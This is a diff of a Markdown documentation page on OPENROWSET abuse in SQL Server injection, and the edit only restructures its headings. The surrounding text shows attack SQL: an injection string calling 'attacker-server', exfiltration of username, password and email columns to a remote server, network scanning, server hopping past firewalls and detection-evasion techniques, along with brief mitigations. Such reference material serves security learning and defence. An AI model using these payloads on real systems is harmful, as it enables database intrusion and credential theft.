@@ -7,11 +7,9 @@ tags: ["openrowset", "linked servers", "data access"]
 lastUpdated: 2025-03-15
 ---
 
-## OPENROWSET Attacks
-
 The `OPENROWSET` function in Microsoft SQL Server provides a way to access remote data from various data sources including other SQL Server instances, Excel files, and virtually any OLE DB provider. While intended for legitimate data integration, this functionality can be exploited in SQL injection attacks to access remote systems, exfiltrate data, or bypass security controls.
 
-### OPENROWSET Basics
+## OPENROWSET Basics
 
 `OPENROWSET` allows ad-hoc connections to remote data sources:
 
@@ -31,7 +29,7 @@ Common providers:
 - 'Microsoft.ACE.OLEDB.12.0' (Access, Excel)
 - 'MSDASQL' (ODBC)
 
-### Prerequisites for Exploitation
+## Prerequisites for Exploitation
 
 OPENROWSET attacks typically require:
 
@@ -47,9 +45,9 @@ OPENROWSET attacks typically require:
 2. Sufficient permissions (typically sysadmin or similar high privileges)
 3. Appropriate network connectivity from the SQL Server to target systems
 
-### Attack Techniques
+## Attack Techniques
 
-#### Remote SQL Server Access
+### Remote SQL Server Access
 
 Connect to another SQL Server to access or exfiltrate data:
 
@@ -87,7 +85,7 @@ SELECT * FROM OPENROWSET(
 );
 ```
 
-#### File System Access
+### File System Access
 
 Read or write files using OPENROWSET with Excel or text providers:
 
@@ -107,7 +105,7 @@ SELECT * FROM OPENROWSET(
 )
 ```
 
-#### Network Scanning
+### Network Scanning
 
 OPENROWSET can be used for internal network scanning:
 
@@ -122,7 +120,7 @@ BEGIN CATCH
 END CATCH
 ```
 
-#### Data Exfiltration to Remote Servers
+### Data Exfiltration to Remote Servers
 
 ```sql
 -- Exfiltrate data to another SQL Server
@@ -134,7 +132,7 @@ INSERT INTO OPENROWSET(
 SELECT username, password, email FROM users
 ```
 
-#### Command Execution via SQL Server Agent
+### Command Execution via SQL Server Agent
 
 This technique combines OPENROWSET with SQL Server Agent to execute commands:
 
@@ -156,16 +154,16 @@ EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
 'msdb.dbo.sp_start_job @job_name='''+@job_name+'''')
 ```
 
-### Practical SQL Injection Examples
+## Practical SQL Injection Examples
 
-#### Basic OPENROWSET Injection
+### Basic OPENROWSET Injection
 
 ```sql
 -- Injection in a vulnerable query
 ' UNION SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker-server;uid=sa;pwd=password;', 'SELECT @@version')--
 ```
 
-#### Nested OPENROWSET Attacks
+### Nested OPENROWSET Attacks
 
 ```sql
 -- Chain multiple OPENROWSET calls
@@ -176,7 +174,7 @@ EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
         ''SELECT * FROM sensitive_table'')')--
 ```
 
-#### Bypassing Network Restrictions
+### Bypassing Network Restrictions
 
 When direct connections are blocked by firewalls, OPENROWSET can be used to "hop" through servers:
 
@@ -189,9 +187,9 @@ When direct connections are blocked by firewalls, OPENROWSET can be used to "hop
         ''SELECT * FROM sensitive_data'')')--
 ```
 
-### Defense Evasion Techniques
+## Defense Evasion Techniques
 
-#### Dynamic Construction to Avoid Detection
+### Dynamic Construction to Avoid Detection
 
 ```sql
 -- Using variables to avoid string detection
@@ -201,7 +199,7 @@ DECLARE @query nvarchar(100) = 'SELECT * FROM users'
 EXEC('SELECT * FROM OPENROWSET(''' + @provider + ''', ''' + @conn + ''', ''' + @query + ''')')
 ```
 
-#### Using Alternative Providers
+### Using Alternative Providers
 
 ```sql
 -- Using less common providers
@@ -210,7 +208,7 @@ SELECT * FROM OPENROWSET('MSDASQL',
     'SELECT @@version')
 ```
 
-### Mitigations and Countermeasures
+## Mitigations and Countermeasures
 
 To prevent OPENROWSET attacks:
 
@@ -242,7 +240,7 @@ To prevent OPENROWSET attacks:
    WHERE s.text LIKE '%OPENROWSET%'
    ```
 
-### Limitations and Considerations
+## Limitations and Considerations
 
 1. OPENROWSET requires specific server configurations and high privileges
 2. Some providers may not be installed or available on all SQL Server instances
